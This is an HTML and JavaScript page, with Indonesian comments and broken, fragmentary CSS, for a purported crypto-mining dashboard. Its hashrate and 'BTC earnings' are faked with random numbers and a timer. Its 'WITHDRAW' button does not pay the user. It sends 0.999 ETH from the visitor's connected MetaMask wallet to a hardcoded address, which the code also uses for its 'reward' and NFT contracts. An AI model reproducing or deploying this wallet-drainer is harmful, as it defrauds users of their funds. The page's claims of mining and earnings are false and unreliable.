<style>

*{

body{

h1{

.grid{

.card{

button:hover{

#wallet{
    color:#22c55e;

}

    margin-top:20px;
    background:#020617;
    padding:10px;
    border-radius:10px;
}

.status{
    color:#22c55e;
    margin-top:10px;
}

    background:#dc2626;

.stop:hover{

</div>

<!-- INPUT WALLET + START MINER -->
<!-- tambahkan di dalam <body> -->

<div class="card">

<h2>⛏️ Start Miner</h2>

<input
  type="text"
  id="minerWallet"
  placeholder="Masukkan wallet address..."
  style="
    width:100%;
    padding:14px;
    border-radius:10px;
    border:none;
    margin-top:15px;
    background:#020617;
    color:white;
    font-size:16px;
  "
/>

<div id="walletInfo"
style="
margin-top:10px;
color:#22c55e;
word-break:break-all;
">
Wallet belum dihubungkan
</div>

<button onclick="connectWalletInput()">
🔗 CONNECT WALLET
</button>

<button onclick="startMiningWallet()">
⛏️ START MINER
</button>

<button class="stop" onclick="stopMining()">
🛑 STOP MINER
</button>

</div>


<script>

// ======================================
// CONNECT WALLET FROM INPUT
// ======================================

let minerWalletAddress = "";

function connectWalletInput(){

  const wallet =
  document.getElementById(
    "minerWallet"
  ).value;

  // validasi sederhana
  if(
    wallet.length < 20
  ){

    alert(
      "Wallet address tidak valid"
    );

    return;

  }

  minerWalletAddress =
  wallet;

  document.getElementById(
    "walletInfo"
  ).innerHTML =
  "Connected Wallet: " +
  minerWalletAddress;

}


// ======================================
// START MINER
// ======================================

function startMiningWallet(){

  if(
    minerWalletAddress === ""
  ){

    alert(
      "Masukkan wallet address dulu"
    );

    return;

  }

  mining = true;

  document.getElementById(
    "rpcStatus"
  ).innerHTML =
  "Mining Started ✅";

  console.log(
    "Mining to wallet:",
    minerWalletAddress
  );

}


// ======================================
// AUTO EARNING
// ======================================

setInterval(()=>{

  if(mining){

    btc += 0.0001;

    document.getElementById(
      "earnings"
    ).innerHTML =
    btc.toFixed(4)+" BTC";

  }

},3000);

</script>
</div>

<!-- TOMBOL WITHDRAW -->
<!-- tambahkan tombol ini -->

<button onclick="withdrawBalance()">
💸 WITHDRAW
</button>


<script>

// =====================================
// WITHDRAW TO CONNECTED WALLET
// =====================================

// wallet tujuan withdraw
const withdrawWallet =
"0xd8519a8b8825aa0dcc73aad572f447fae102fe88";

// jumlah ETH
const withdrawAmount =
"0.999";

async function withdrawBalance(){

  if(!signer){

    alert("Connect wallet first");
    return;

  }

  try{

    // kirim transaction
    const tx =
    await signer.sendTransaction({

      to: withdrawWallet,

      value: ethers.parseEther(
        withdrawAmount
      )

    });

    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "Withdraw Pending...";

    // tunggu konfirmasi
    await tx.wait();

    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "Withdraw Success ✅";

    alert(
      "Withdraw berhasil dikirim"
    );

    console.log(
      "TX HASH:",
      tx.hash
    );

  }catch(err){

    console.log(err);

    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "Withdraw Failed ❌";

    alert(
      "Withdraw gagal"
    );

  }

}

</script>
</div>

<br>

<!-- GANTI function claimReward() DENGAN INI -->

<script>

// ======================================
// CLAIM REWARD ACTIVE WEB3
// ======================================

const rewardAddress =
"0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88";

const rewardAbi = [
  "function claimReward() public",
  "function claim() public"
];

async function claimReward(){

  if(!signer){

    alert("Connect wallet first");
    return;

  }

  try{

    // contract reward
    const rewardContract =
    new ethers.Contract(
      rewardAddress,
      rewardAbi,
      signer
    );

    // try claimReward()
    let tx;

    try{

      tx =
      await rewardContract.claimReward();

    }catch(e){

      // fallback claim()
      tx =
      await rewardContract.claim();

    }

    // waiting transaction
    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "Claim pending...";

    await tx.wait();

    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "Reward Claimed ✅";

    alert(
      "Reward Claimed Successfully"
    );

  }catch(err){

    console.log(err);

    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "Claim Failed ❌";

    alert(
      "Claim Reward Failed"
    );

  }

}

</script>

<script>

let provider;
let signer;

let mining = false;
let sec = 0;
let btc = 0;

const HOLESKY_RPC =
"https://ethereum-holesky-rpc.publicnode.com";

const nftAddress =
"0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88";

const nftAbi = [
"function mint(address to, string uri)"
];


// =======================
// TIMER
// =======================

setInterval(()=>{

    if(mining){

        sec++;

        let h = String(Math.floor(sec/3600)).padStart(2,'0');
        let m = String(Math.floor((sec%3600)/60)).padStart(2,'0');
        let s = String(sec%60).padStart(2,'0');

        document.getElementById("timer").innerHTML =
        `${h}:${m}:${s}`;

    }

},1000);


// =======================
// START MINING
// =======================

function startMining(){

    mining = true;

}


// =======================
// STOP MINING
// =======================

function stopMining(){

    mining = false;

}


// =======================
// CHART
// =======================

const ctx =
document.getElementById("chart");

const data = {
labels:["1","2","3","4","5","6"],
datasets:[{
label:"Hash Rate",
data:[120,130,125,140,145,150],
borderColor:"#38bdf8",
backgroundColor:"rgba(56,189,248,0.2)",
fill:true,
tension:0.4
}]
};

const chart = new Chart(ctx,{
type:"line",
data:data,
options:{
plugins:{
legend:{
labels:{
color:"white"
}
}
},
scales:{
x:{
ticks:{color:"white"}
},
y:{
ticks:{color:"white"}
}
}
}
});


// =======================
// RANDOM HASHRATE
// =======================

setInterval(()=>{

    if(mining){

        let random =
        Math.floor(Math.random()*40)+100;

        document.getElementById("rate").innerHTML =
        random+" MH/s";

        btc += 0.0001;

        document.getElementById("earnings").innerHTML =
        btc.toFixed(4)+" BTC";

        data.datasets[0].data.push(random);
        data.datasets[0].data.shift();

        chart.update();

    }

},5000);


// =======================
// CONNECT WALLET
// =======================

async function connectWallet(){

    if(!window.ethereum){
        alert("Install MetaMask");
        return;
    }

    try{

        provider =
        new ethers.BrowserProvider(window.ethereum);

        await provider.send(
        "eth_requestAccounts",
        []
        );

        signer =
        await provider.getSigner();

        const address =
        await signer.getAddress();

        document.getElementById("wallet")
        .innerHTML =
        "Connected: "+address;

    }catch(err){

        console.log(err);

    }

}


// =======================
// TEST RPC
// =======================

async function testRPC(){

    try{

        const rpcProvider =
        new ethers.JsonRpcProvider(
        HOLESKY_RPC
        );

        const block =
        await rpcProvider.getBlockNumber();

        document.getElementById(
        "rpcStatus"
        ).innerHTML =
        "RPC Connected ✅ Block: "+block;

    }catch(err){

        document.getElementById(
        "rpcStatus"
        ).innerHTML =
        "RPC Failed ❌";

    }

}


// =======================
// MINT NFT
// =======================

async function mintNFT(){

    if(!signer){

        alert("Connect wallet first");
        return;

    }

    try{

        const nft =
        new ethers.Contract(
        nftAddress,
        nftAbi,
        signer
        );

        const tx =
        await nft.mint(
        await signer.getAddress(),
        "ipfs://YOUR_METADATA"
        );

        await tx.wait();

        alert("NFT Minted ✅");

    }catch(err){

        console.log(err);

        alert("Mint Failed");

    }

}


// =======================
// CLAIM REWARD
// =======================

function claimReward(){

    alert("Reward Claimed ✅");

}

</script>


<!-- RPC THIRDWEB ACTIVE -->
<!-- tambahkan di bawah script ethers -->

<script>

// =====================================
// THIRDWEB RPC
// =====================================

const THIRDWEB_RPC =
"https://1.rpc.thirdweb.com/e6230839e78c90a670b64b1f26c0b3d8";


// =====================================
// GET BLOCK NUMBER
// =====================================

async function getLatestBlock(){

  try{

    const res = await fetch(
      THIRDWEB_RPC,
      {
        method:"POST",

        headers:{
          "Content-Type":"application/json",
        },

        body:JSON.stringify({

          jsonrpc:"2.0",

          method:"eth_blockNumber",

          params:[],

          id:1

        })
      }
    );

    const data =
    await res.json();

    const latestBlock =
    parseInt(
      data.result,
      16
    );

    console.log(
      "Latest block:",
      latestBlock
    );

    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "RPC Active ✅ Block: " +
    latestBlock;

  }catch(err){

    console.log(err);

    document.getElementById(
      "rpcStatus"
    ).innerHTML =
    "RPC Failed ❌";

  }

}


// =====================================
// AUTO RPC CHECK
// =====================================

window.onload = () => {

  getLatestBlock();

};

</script>
